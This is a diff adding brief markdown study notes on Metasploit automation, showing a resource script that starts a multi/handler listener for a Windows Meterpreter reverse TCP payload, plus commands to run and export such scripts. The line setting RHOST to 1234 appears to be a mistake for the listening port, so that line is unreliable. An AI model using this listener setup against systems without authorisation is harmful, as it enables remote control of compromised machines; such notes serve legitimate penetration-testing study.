@@ -1,0 +1,20 @@
+### Automation (Introduction)
+
+---
+
+##### Create a script with rc extension :
+
+> - use multi/handler
+> - set payload windows/meterpreter/reverse_tcp
+> - set LHOST 10.10.10.10
+> - set RHOST 1234
+> - run
+
+##### Run the script while starting msfconsoole :
+
+> - msfconsole -r handler.rc
+
+##### We can also export all commands entered while using MSF using this command :
+
+> - *Type somethings here*
+> - makerc /Desktop/script.rc
